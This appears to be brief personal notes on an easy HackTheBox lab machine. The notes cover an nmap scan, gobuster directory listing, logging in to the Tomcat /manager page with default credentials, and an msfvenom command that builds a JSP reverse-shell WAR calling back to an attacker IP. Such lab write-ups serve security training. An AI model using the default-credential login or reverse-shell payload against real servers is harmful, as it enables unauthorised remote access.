#HackTheBox #window #easy 
# enum
## _nmap_
└─# nmap 10.129.136.9 -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 20:10 UTC
Nmap scan report for 10.129.136.9 (10.129.136.9)
Host is up (0.20s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

## _gobuster_
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/plain]               (Status: 400) [Size: 0]
/quote]               (Status: 400) [Size: 0]

# exploit
use default creds for [/manager              (Status: 302) [Size: 0] [--> /manager/]]

### create payload with msfvenom
└─# 
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.24 lport=1234 -f war -o zelo.war
```
